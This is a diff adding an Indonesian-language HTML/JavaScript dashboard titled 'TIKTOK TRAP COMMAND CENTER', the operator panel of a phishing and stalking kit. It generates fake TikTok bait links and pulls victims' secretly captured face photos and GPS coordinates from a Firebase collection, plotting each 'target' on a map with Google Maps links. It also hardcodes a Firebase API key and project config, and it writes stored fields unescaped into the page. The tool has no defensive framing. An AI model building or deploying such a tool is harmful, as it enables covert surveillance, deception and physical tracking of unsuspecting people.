@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Command Center - Target Monitor</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #090d16; font-family: 'Plus Jakarta Sans', sans-serif; color: #fff; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+    
+    header { background: #111827; padding: 12px 20px; border-bottom: 1px solid #1f2937; display: flex; justify-content: space-between; align-items: center; }
+    header h2 { font-size: 1rem; color: #818cf8; display: flex; align-items: center; gap: 8px; }
+    .status-dot { width: 10px; height: 10px; background: #22c55e; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #22c55e; animation: pulse 1.5s infinite; }
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+
+    .main-grid { display: grid; grid-template-columns: 420px 1fr; height: calc(100vh - 53px); }
+    
+    .sidebar { background: #111827; border-right: 1px solid #1f2937; overflow-y: auto; padding: 12px; display: flex; flex-direction: column; gap: 10px; }
+    
+    /* Generator Box */
+    .generator-box { background: #1f2937; border: 1px solid #374151; border-radius: 10px; padding: 12px; margin-bottom: 4px; }
+    .generator-box h3 { font-size: 0.85rem; color: #f3f4f6; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
+    .generator-box input { width: 100%; padding: 8px 10px; background: #111827; border: 1px solid #4b5563; border-radius: 6px; color: #fff; font-size: 0.75rem; margin-bottom: 8px; }
+    .generator-box button { width: 100%; padding: 8px; background: #6366f1; color: #fff; border: none; border-radius: 6px; font-weight: 600; font-size: 0.75rem; cursor: pointer; }
+    .generator-box button:hover { background: #4f46e5; }
+    .link-result { margin-top: 8px; font-size: 0.7rem; color: #22c55e; word-break: break-all; background: #111827; padding: 6px; border-radius: 4px; display: none; }
+
+    .target-card { background: #1f2937; border: 1px solid #374151; border-radius: 10px; padding: 10px; display: flex; gap: 10px; align-items: center; position: relative; }
+    .target-card img { width: 65px; height: 65px; object-fit: cover; border-radius: 8px; border: 1px solid #4b5563; cursor: pointer; transition: 0.2s; }
+    .target-card img:hover { opacity: 0.8; transform: scale(1.03); }
+    
+    .target-info { font-size: 0.75rem; color: #9ca3af; flex-grow: 1; overflow: hidden; }
+    .target-info b { color: #f3f4f6; font-size: 0.8rem; display: block; margin-bottom: 2px; }
+    
+    .btn-action { display: flex; gap: 4px; margin-top: 6px; flex-wrap: wrap; }
+    .btn-custom { padding: 4px 8px; border-radius: 6px; font-size: 0.68rem; font-weight: 600; border: none; cursor: pointer; text-decoration: none; text-align: center; }
+    .btn-map { background: #0284c7; color: #fff; }
+    .btn-photo { background: #6366f1; color: #fff; }
+    .btn-delete { background: #ef4444; color: #fff; }
+
+    #map { width: 100%; height: 100%; background: #090d16; }
+
+    .modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; }
+    .modal-content { background: #111827; padding: 20px; border-radius: 14px; border: 1px solid #374151; text-align: center; max-width: 340px; width: 90%; }
+    .modal-content img { width: 100%; max-height: 300px; object-fit: cover; border-radius: 10px; border: 1px solid #4b5563; margin-bottom: 12px; }
+    .close-modal { background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 0.8rem; width: 100%; }
+
+    @media(max-width: 768px) {
+      .main-grid { grid-template-columns: 1fr; grid-template-rows: 280px 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h2><span class="status-dot"></span> TIKTOK TRAP COMMAND CENTER</h2>
+    <span style="font-size: 0.75rem; color: #9ca3af;" id="totalTarget">Total Masuk: 0</span>
+  </header>
+
+  <div class="main-grid">
+    <div class="sidebar" id="sidebarList">
+      <!-- Link Generator -->
+      <div class="generator-box">
+        <h3>🔗 Buat Fake Link TikTok</h3>
+        <input type="text" id="customParam" placeholder="Judul/Topik Video (Contoh: Viral_Terbaru)">
+        <button onclick="generateLink()">Generate Link Umpan</button>
+        <div id="linkResult" class="link-result"></div>
+      </div>
+      <p style="text-align: center; color: #6b7280; font-size: 0.8rem; margin-top: 10px;">Menunggu target masuk...</p>
+    </div>
+    <div id="map"></div>
+  </div>
+
+  <div id="photoModal" class="modal">
+    <div class="modal-content">
+      <h3 style="font-size: 0.95rem; color: #818cf8; margin-bottom: 10px;">👤 Foto Muka Target</h3>
+      <img id="modalImg" src="" alt="Muka Target">
+      <p id="modalInfo" style="font-size: 0.75rem; color: #9ca3af; margin-bottom: 12px;"></p>
+      <button class="close-modal" onclick="closePhotoModal()">Tutup</button>
+    </div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAzJ6p_stDYeaviIK1CapIpz_pc8onN5hM",
+      authDomain: "spaceman-sukses.firebaseapp.com",
+      projectId: "spaceman-sukses",
+      storageBucket: "spaceman-sukses.firebasestorage.app",
+      messagingSenderId: "442967300277",
+      appId: "1:442967300277:web:65b99aebdbc478455586fc"
+    };
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let map = L.map('map').setView([-2.548926, 118.014863], 5);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      maxZoom: 19,
+      attribution: '© OpenStreetMap'
+    }).addTo(map);
+
+    let markersLayer = L.layerGroup().addTo(map);
+
+    function generateLink() {
+      const param = document.getElementById('customParam').value.trim() || 'Video_Viral';
+      const baseUrl = window.location.href.replace('admin.html', 'index.html');
+      const finalLink = `${baseUrl}?v=${encodeURIComponent(param)}`;
+      const resBox = document.getElementById('linkResult');
+      resBox.style.display = 'block';
+      resBox.innerHTML = `Link: <a href="${finalLink}" target="_blank" style="color: #60a5fa;">${finalLink}</a>`;
+    }
+
+    db.collection("target_logs").orderBy("time", "desc").onSnapshot((snapshot) => {
+      const sidebarList = document.getElementById('sidebarList');
+      document.getElementById('totalTarget').textContent = `Total Masuk: ${snapshot.size}`;
+      
+      let generatorHtml = sidebarList.querySelector('.generator-box').outerHTML;
+
+      if (snapshot.empty) {
+        sidebarList.innerHTML = generatorHtml + `<p style="text-align: center; color: #6b7280; font-size: 0.8rem; margin-top: 20px;">Belum ada target.</p>`;
+        return;
+      }
+
+      let html = generatorHtml;
+      markersLayer.clearLayers();
+      let first = true;
+
+      snapshot.forEach((doc) => {
+        const id = doc.id;
+        const d = doc.data();
+        const lat = parseFloat(d.latitude);
+        const lng = parseFloat(d.longitude);
+        const safePhoto = d.photo || '';
+        const safeTime = d.time || '-';
+        const safePrompt = d.prompt ? d.prompt : 'TikTok Visitor';
+
+        html += `
+          <div class="target-card">
+            <img src="${safePhoto}" alt="Foto" onclick="openPhotoModal('${safePhoto}', '${safeTime}')" title="Klik untuk perbesar">
+            <div class="target-info">
+              <b>🕒 ${safeTime}</b>
+              <span>📌 Topik: ${safePrompt}</span>
+              <div class="btn-action">
+                <button class="btn-custom btn-photo" onclick="openPhotoModal('${safePhoto}', '${safeTime}')">🔍 Muka</button>
+                ${!isNaN(lat) && !isNaN(lng) ? `<button class="btn-custom btn-map" onclick="focusMap(${lat},${lng})">📍 Lokasi</button>` : ''}
+                <button class="btn-custom btn-delete" onclick="deleteTarget('${id}')">🗑️ Hapus</button>
+              </div>
+            </div>
+          </div>
+        `;
+
+        if (!isNaN(lat) && !isNaN(lng)) {
+          let marker = L.marker([lat, lng]).bindPopup(`
+            <div style="text-align: center; color: #000;">
+              <img src="${safePhoto}" style="width: 70px; height: 70px; object-item: cover; border-radius: 6px; margin-bottom: 4px; cursor:pointer;" onclick="openPhotoModal('${safePhoto}', '${safeTime}')"><br>
+              <b>Waktu:</b> ${safeTime}<br>
+              <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color: #2563eb; font-weight: bold;">Buka Google Maps</a>
+            </div>
+          `);
+          markersLayer.addLayer(marker);
+
+          if (first) {
+            map.setView([lat, lng], 16);
+            first = false;
+          }
+        }
+      });
+
+      sidebarList.innerHTML = html;
+    });
+
+    function focusMap(lat, lng) { map.setView([lat, lng], 17); }
+    function openPhotoModal(photoUrl, timeStr) {
+      document.getElementById('modalImg').src = photoUrl;
+      document.getElementById('modalInfo').textContent = `Waktu Tertangkap: ${timeStr}`;
+      document.getElementById('photoModal').style.display = 'flex';
+    }
+    function closePhotoModal() { document.getElementById('photoModal').style.display = 'none'; }
+    async function deleteTarget(id) {
+      if (confirm("Hapus data target ini?")) {
+        try { await db.collection("target_logs").doc(id).delete(); } catch (e) { alert("Gagal menghapus."); }
+      }
+    }
+  </script>
+</body>
+</html>
